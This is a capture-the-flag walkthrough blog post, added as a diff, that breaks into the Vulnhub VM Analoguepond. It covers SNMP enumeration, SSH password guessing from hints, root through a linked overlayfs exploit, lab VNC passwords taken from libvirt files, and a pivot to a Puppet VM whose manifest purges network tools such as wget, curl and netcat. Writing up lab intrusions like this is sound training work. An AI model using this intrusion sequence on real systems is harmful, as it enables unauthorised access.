@@ -1,0 +1,1431 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Pond. Analoguepond - Core dump overflow</title>
+  <meta name="author" content="chousensha">
+
+  
+  
+  <meta name="description" content="Analoguepond writeup">
+  <meta name="keywords" content="analoguepond, pentest lab, vulnhub, ctf, boot2root, analougepond, puppet, reconnoitre">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://chousensha.github.io/blog/2019/05/30/pond-analoguepond">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Core dump overflow" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-51216602-2']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Core dump overflow</a></h1>
+  
+    <h2>Core dump in progress...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:chousensha.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/where-to-start">Where to start</a></li>
+  <li><a href="/book-corner">Book corner</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Pond. Analoguepond</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2019-05-30T21:45:50+03:00" pubdate data-updated="true">May 30<span>th</span>, 2019</time>
+        
+           | <a href="#disqus_thread"
+             data-disqus-identifier="http://chousensha.github.io">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Today&rsquo;s VM should be fun, since it&rsquo;s from knightmare, so we should expect lots of references! I&rsquo;m also not sure about the actual name of the box, if it&rsquo;s Analougepond or Analoguepond. A promising start =D</p>
+
+<blockquote><p>Remember TCP is not the only protocol on the Internet My challenges are never finished with root. I make you work for the flags. The intended
+route is NOT to use forensics or 0-days, I will not complain either way.</p>
+
+<p>To consider this VM complete, you need to have obtained:</p>
+
+<p>   Troll Flag: where you normally look for them</p>
+
+<p>   Flag 1: You have it when you book Jennifer tickets to Paris on Pan Am.</p>
+
+<p>   Flag 2: It will include a final challenge to confirm you hit the jackpot.</p>
+
+<p>   Have root everywhere (this will make sense once you&rsquo;re in the VM)</p>
+
+<p>   User passwords</p>
+
+<p>   2 VNC passwords</p>
+
+<p>Best of luck! If you get stuck, eat some EXTRABACON</p>
+
+<p>NB: Please allow 5-10 minutes or so from powering on the VM for background tasks to run before proceeding to attack.</p></blockquote>
+
+<!-- more -->
+
+
+<p>For the recon part, today I&rsquo;ll be using <a href="https://github.com/codingo/Reconnoitre">Reconnoitre</a></p>
+
+<blockquote><p>A reconnaissance tool made for the OSCP labs to automate information gathering and service enumeration whilst creating a directory structure to store results, findings and exploits used for > each host, recommended commands to execute and directory structures for storing loot and flags.</p></blockquote>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>reconnoitre -h
+</span><span class='line'>usage: reconnoitre [-h] -t TARGET_HOSTS -o OUTPUT_DIRECTORY [-w WORDLIST]
+</span><span class='line'>                   [-p PORT] [--pingsweep] [--dns] [--services] [--hostnames]
+</span><span class='line'>                   [--snmp] [--quick] [--virtualhosts]
+</span><span class='line'>                   [--ignore-http-codes IGNORE_HTTP_CODES]
+</span><span class='line'>                   [--ignore-content-length IGNORE_CONTENT_LENGTH] [--quiet]
+</span><span class='line'>                   [--no-udp]
+</span><span class='line'>
+</span><span class='line'>optional arguments:
+</span><span class='line'>  -h, --help            show this help message and exit
+</span><span class='line'>  -t TARGET_HOSTS       Set a target range of addresses to target. Ex
+</span><span class='line'>                        10.11.1.1-255
+</span><span class='line'>  -o OUTPUT_DIRECTORY   Set the output directory. Ex /root/Documents/labs/
+</span><span class='line'>  -w WORDLIST           Set the wordlist to use for generated commands. Ex
+</span><span class='line'>                        /usr/share/wordlist.txt
+</span><span class='line'>  -p PORT               Set the port to use. Leave blank to use discovered
+</span><span class='line'>                        ports. Useful to force virtual host scanning on non-
+</span><span class='line'>                        standard webserver ports.
+</span><span class='line'>  --pingsweep           Write a new target.txt by performing a ping sweep and
+</span><span class='line'>                        discovering live hosts.
+</span><span class='line'>  --dns, --dnssweep     Find DNS servers from a list of targets.
+</span><span class='line'>  --services            Perform service scan over targets.
+</span><span class='line'>  --hostnames           Attempt to discover target hostnames and write to
+</span><span class='line'>                        0-name.txt and hostnames.txt.
+</span><span class='line'>  --snmp                Perform service scan over targets.
+</span><span class='line'>  --quick               Move to the next target after performing a quick scan
+</span><span class='line'>                        and writing first-round recommendations.
+</span><span class='line'>  --virtualhosts        Attempt to discover virtual hosts using the specified
+</span><span class='line'>                        wordlist.
+</span><span class='line'>  --ignore-http-codes IGNORE_HTTP_CODES
+</span><span class='line'>                        Comma separated list of http codes to ignore with
+</span><span class='line'>                        virtual host scans.
+</span><span class='line'>  --ignore-content-length IGNORE_CONTENT_LENGTH
+</span><span class='line'>                        Ignore content lengths of specificed amount. This may
+</span><span class='line'>                        become useful when a server returns a static page on
+</span><span class='line'>                        every virtual host guess.
+</span><span class='line'>  --quiet               Supress banner and headers to limit to comma dilimeted
+</span><span class='line'>                        results only.
+</span><span class='line'>  --no-udp              Disable UDP services scan over targets.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I ran reconnoitre and it created a directory structure with multiple files:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>reconnoitre -t 192.168.159.136 --services -o .
+</span><span class='line'>  __
+</span><span class='line'>|\"\"\"\-=  RECONNOITRE
+</span><span class='line'>(____)      An OSCP scanner by @codingo_
+</span><span class='line'>
+</span><span class='line'>[+] Testing for required utilities on your system.
+</span><span class='line'>[#] Performing service scans
+</span><span class='line'>[*] Loaded single target: 192.168.159.136
+</span><span class='line'>[+] Creating directory structure for 192.168.159.136
+</span><span class='line'>   [&gt;] Creating scans directory at: ./192.168.159.136/scans
+</span><span class='line'>   [&gt;] Creating exploit directory at: ./192.168.159.136/exploit
+</span><span class='line'>   [&gt;] Creating loot directory at: ./192.168.159.136/loot
+</span><span class='line'>   [&gt;] Creating proof file at: ./192.168.159.136/proof.txt
+</span><span class='line'>[+] Starting quick nmap scan for 192.168.159.136
+</span><span class='line'>[+] Writing findings for 192.168.159.136
+</span><span class='line'>[*] Found SSH service on 192.168.159.136:22
+</span><span class='line'>[*] TCP quick scans completed for 192.168.159.136
+</span><span class='line'>[+] Starting detailed TCP/UDP nmap scans for 192.168.159.136
+</span><span class='line'>[+] Writing findings for 192.168.159.136
+</span><span class='line'>[*] Found SSH service on 192.168.159.136:22
+</span><span class='line'>[*] TCP/UDP scans completed for 192.168.159.136</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The files contain the commands that were run and the output, along with recommendations. The scans revealed that SSH and SNMP are open on the box:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PORT   STATE SERVICE REASON         VERSION
+</span><span class='line'>22/tcp open  ssh     syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+</span><span class='line'>161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
+</span><span class='line'>| snmp-info:
+</span><span class='line'>|   enterprise: net-snmp
+</span><span class='line'>|   engineIDFormat: unknown
+</span><span class='line'>|   engineIDData: 096a5051642b555800000000
+</span><span class='line'>|   snmpEngineBoots: 19
+</span><span class='line'>|_  snmpEngineTime: 3h58m00s
+</span><span class='line'>| snmp-sysdescr: Linux analoguepond 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64
+</span><span class='line'>|_  System uptime: 3h58m0.20s (1428020 timeticks)
+</span><span class='line'>Service Info: Host: analoguepond</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next I enumerated the SNMP information:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>snmp-check 192.168.159.136
+</span><span class='line'>snmp-check v1.9 - SNMP enumerator
+</span><span class='line'>Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)
+</span><span class='line'>
+</span><span class='line'>[+] Try to connect to 192.168.159.136:161 using SNMPv1 and community 'public'
+</span><span class='line'>
+</span><span class='line'>[*] System information:
+</span><span class='line'>
+</span><span class='line'>  Host IP address               : 192.168.159.136
+</span><span class='line'>  Hostname                      : analoguepond
+</span><span class='line'>  Description                   : Linux analoguepond 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64
+</span><span class='line'>  Contact                       : Eric Burdon &lt;eric@example.com&gt;
+</span><span class='line'>  Location                      : There is a house in New Orleans they call it...
+</span><span class='line'>  Uptime snmp                   : 05:15:30.80
+</span><span class='line'>  Uptime system                 : 05:15:20.10
+</span><span class='line'>  System date                   : 2019-5-23 15:39:09.0</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We have a possible user account called <em>eric</em>. I googled the line about New Orleans and found it&rsquo;s from a song:</p>
+
+<blockquote><p>There is a house in New Orleans
+They call the rising sun</p></blockquote>
+
+<p>The credentials <code>eric/therisingsun</code> worked for SSH. In the home directory I found a funny image that may be useful for something later:</p>
+
+<p><img class="center" src="/images/pentest/analoguepond/reticulatingsplines.gif" title="reticulatingsplines" alt="reticulatingsplines"></p>
+
+<p>I ran LinEnum on the box and noticed some VMs running on it:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[-] ARP history:
+</span><span class='line'>barringsbank.example.com (192.168.122.3) at 52:54:00:6d:93:6a [ether] on virbr0
+</span><span class='line'>? (192.168.159.129) at 00:0c:29:9c:6f:0f [ether] on eth0
+</span><span class='line'>puppet.example.com (192.168.122.2) at 52:54:00:5b:05:f7 [ether] on virbr0
+</span><span class='line'>? (192.168.159.1) at 00:50:56:c0:00:01 [ether] on eth0</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Troll flag</h2>
+
+<p>The OS running is Ubuntu 14.04.5 LTS, so it&rsquo;s vulnerable to the <a href="https://www.exploit-db.com/exploits/39166">overlayfs exploit</a>. With it, I got root easily, and read the first flag:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@analoguepond:/root# cat flag.txt
+</span><span class='line'>C'Mon Man! Y'all didn't think this was the final flag so soon...?
+</span><span class='line'>
+</span><span class='line'>Did the bright lights and big city knock you out...? If you pull
+</span><span class='line'>a stunt like this again, I'll send you back to Walker...
+</span><span class='line'>
+</span><span class='line'>This is obviously troll flah #1 So keep going.</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>2 VNC passwords</h2>
+
+<p>Ok, we have root, but this is only the beginning. We know that we should find 2 VNC passwords, and they are probably for the 2 VMs we identified earlier. I confirmed it:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@analoguepond:/etc/libvirt/qemu# netstat -antp | grep 5900
+</span><span class='line'>tcp        0      0 127.0.0.1:5900          0.0.0.0:*               LISTEN      1260/qemu-system-x8</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I searched for the VM configuration files, they were located in <code>/etc/libvirt/qemu</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@analoguepond:/etc/libvirt/qemu# ls *.xml
+</span><span class='line'>barringsbank.xml  puppet.xml</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I read the files and found the password for <strong>barringsbank</strong> is <code>memphistennessee</code>, while the password for <strong>puppet</strong> is <code>sendyoubacktowalker</code>. Since nc was installed on the box, I used it to port scan the VMs. They didn&rsquo;t have 5900 port open, but they did have SSH listening:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@analoguepond:/etc/libvirt/qemu# nc -zv 192.168.122.3 22
+</span><span class='line'>Connection to 192.168.122.3 22 port [tcp/ssh] succeeded!
+</span><span class='line'>root@analoguepond:/etc/libvirt/qemu# nc -zv 192.168.122.2 22
+</span><span class='line'>Connection to 192.168.122.2 22 port [tcp/ssh] succeeded!</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Rooting puppet</h2>
+
+<p>I tried to SSH on the puppet VM first, to see if I can get any info, and the banner did not disappoint:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ssh root@192.168.122.2
+</span><span class='line'>+-----------------------------------------------------------------------------+
+</span><span class='line'>| Passwords are very dated.. Removing spaces helps sandieshaw log in with her |
+</span><span class='line'>| most famous song                                                            |
+</span><span class='line'>+-----------------------------------------------------------------------------+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We found out there&rsquo;s a sandieshaw user and got a hint for the password. After a little Googling, I learned that one of Sandie Shaw&rsquo;s most famous songs is Puppet on a String..and this suits the VM, so I removed the spaces and tried lowercase first, and got in with <code>sandieshaw/puppetonastring</code>.</p>
+
+<p>This seems to be a Puppet-centric machine. Puppet is a tool for automating infrastructure and software configuration management. You can learn more from <a href="https://puppet.com/">https://puppet.com/</a></p>
+
+<p>Back to the machine, I checked that Puppet is running:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sandieshaw@puppet:~/.puppet$ ps aux | grep puppet
+</span><span class='line'>puppet    1020  0.9  5.1 315408 52728 ?        Ssl  09:21   0:46 /usr/bin/ruby /usr/bin/puppet master
+</span><span class='line'>root      3408  0.5  0.0   4448   672 ?        Ss   10:40   0:00 /bin/sh -c /usr/bin/puppet agent --test &gt; /dev/null 2&gt;&1
+</span><span class='line'>root      3409 24.8  1.9  79220 20312 ?        Sl   10:40   0:04 /usr/bin/ruby /usr/bin/puppet agent --test</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then I looked inside puppet&rsquo;s config directory, in <em>/etc/puppet</em>, and I found lots of configuration files for the barringsbank VM inside <code>modules/vulnhub/files/</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sandieshaw@puppet:/etc/puppet/modules/vulnhub/files$ ls
+</span><span class='line'>barringsbank-group      barringsbank-passwd       hosts.deny    puppet-hosts.allow  puppet-sshd_config  sudoers
+</span><span class='line'>barringsbank-hosts.allow  barringsbank-sshd_config  puppet-group  puppet-passwd       sshd_config   sudoers.d</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In the <em>barringsbank-passwd</em> file, I found the user list, the interesting one to keep in mind is:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nleeson:x:1000:1000:Nicholas Leeson,,,:/home/nleeson:/bin/bash</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Continuing with the information gathering, the <em>barringsbank-sshd_config</em> reveals that public key authentication is used for SSH on the VM.</p>
+
+<p>Inside <em>manifests</em> there&rsquo;s a module called <em>init.pp</em> that removes from the system the useful command line utilities lice nmap, ncaat, etc. and reverses changes to key system files. It&rsquo;s pretty funny and contains references to various Vulnhub users.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+<span class='line-number'>109</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>## Module to unwind changed #vulnhub people make.  This will unwind the most
+</span><span class='line'>## common vectors they used to get at my other VMs
+</span><span class='line'>
+</span><span class='line'>class vulnhub {
+</span><span class='line'>
+</span><span class='line'>## purge packages they abuse too (hello mrB3n, GKNSB, Ch3rn0byl, mr_h4sh)
+</span><span class='line'>$purge = [ "nano", "wget", "curl", "fetch","nmap", "netcat-traditional",
+</span><span class='line'>           "ncat", "netdiscover", "lftp" ]
+</span><span class='line'>  package { $purge:
+</span><span class='line'>  ensure =&gt; purged,
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>## The encryption is still primative Egyptian (Hello drweb)
+</span><span class='line'>$theresas_nightmare = [ "cryptcat", "socat" ]
+</span><span class='line'>  package { $theresas_nightmare:
+</span><span class='line'>  ensure =&gt; present,
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>## Adding to sudoers is a bit naughty so reverse that (most of #vulnhub)
+</span><span class='line'>file { "/etc/sudoers.d":
+</span><span class='line'>  ensure =&gt; "directory",
+</span><span class='line'>  recurse =&gt; true,
+</span><span class='line'>  purge   =&gt; true,
+</span><span class='line'>  force   =&gt; true,
+</span><span class='line'>  owner   =&gt; root,
+</span><span class='line'>  group   =&gt; root,
+</span><span class='line'>  mode    =&gt; 0755,
+</span><span class='line'>  source  =&gt; "puppet:///modules/vulnhub/sudoers.d",
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>## revert /etc/passwd (Hey rfc, kevinnz!)
+</span><span class='line'>file {'/etc/sudoers':
+</span><span class='line'>  ensure =&gt; present,
+</span><span class='line'>  owner  =&gt; root,
+</span><span class='line'>  group  =&gt; root,
+</span><span class='line'>  mode   =&gt; 0440,
+</span><span class='line'>  source =&gt; "puppet:///modules/vulnhub/sudoers",
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>## revert /etc/passwd (Hey Rasta_Mouse!)
+</span><span class='line'>file {'/etc/passwd':
+</span><span class='line'>  ensure =&gt; present,
+</span><span class='line'>  owner  =&gt; root,
+</span><span class='line'>  group  =&gt; root,
+</span><span class='line'>  mode   =&gt; 0644,
+</span><span class='line'>  source =&gt; "puppet:///modules/vulnhub/${hostname}-passwd",
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>## and /etc/group (Hello to you cmaddy)
+</span><span class='line'>file {'/etc/group':
+</span><span class='line'>  ensure =&gt; present,
+</span><span class='line'>  owner  =&gt; root,
+</span><span class='line'>  group  =&gt; root,
+</span><span class='line'>  mode   =&gt; 0644,
+</span><span class='line'>  source =&gt; "puppet:///modules/vulnhub/${hostname}-group",
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>## Mr Potato Head! BACKDOORS ARE NOT SECRETS (Hey GKNSB!)
+</span><span class='line'>file {'/etc/ssh/ssd_config':
+</span><span class='line'>  ensure =&gt; present,
+</span><span class='line'>  owner  =&gt; root,
+</span><span class='line'>  group  =&gt; root,
+</span><span class='line'>  mode   =&gt; 0644,
+</span><span class='line'>  source =&gt; "puppet:///modules/vulnhub/${hostname}-sshd_config",
+</span><span class='line'>  notify =&gt; Service["ssh"],
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>## Leave US keyboard for those crazy yanks, and not to torture Ch3rn0byl like
+</span><span class='line'>## Gibson
+</span><span class='line'>cron { "puppet check in":
+</span><span class='line'>  command =&gt; "/usr/bin/puppet agent --test &gt; /dev/null 2&gt;&1",
+</span><span class='line'>  user =&gt; "root",
+</span><span class='line'>  minute =&gt; "*/10",
+</span><span class='line'>  ensure =&gt; present,
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>## Everyone forbidden by default (Hey wrboyce, rasta_mouse, 8bitkiwi)
+</span><span class='line'>file {'/etc/hosts.deny':
+</span><span class='line'>  ensure =&gt; present,
+</span><span class='line'>  owner  =&gt; root,
+</span><span class='line'>  group  =&gt; root,
+</span><span class='line'>  mode   =&gt; 0644,
+</span><span class='line'>  source =&gt; "puppet:///modules/vulnhub/hosts.deny",
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>## Firewall off to only specific hosts (Hello Bas!)
+</span><span class='line'>file {'/etc/hosts.allow':
+</span><span class='line'>  ensure =&gt; present,
+</span><span class='line'>  owner  =&gt; root,
+</span><span class='line'>  group  =&gt; root,
+</span><span class='line'>  mode   =&gt; 0644,
+</span><span class='line'>  source =&gt; "puppet:///modules/vulnhub/${hostname}-hosts.allow",
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>## Don't fill up the disk (Hey GlobalMaquereau, g0bl1n)
+</span><span class='line'>tidy { "/var/lib/puppet/reports":
+</span><span class='line'>   age     =&gt; "1h",
+</span><span class='line'>   recurse =&gt; true,
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>## Changing openssh config requires restart
+</span><span class='line'>service { 'ssh':
+</span><span class='line'>  ensure      =&gt; running,
+</span><span class='line'>  enable      =&gt; true,
+</span><span class='line'>  hasstatus   =&gt; true,
+</span><span class='line'>  hasrestart  =&gt; true,
+</span><span class='line'>  }
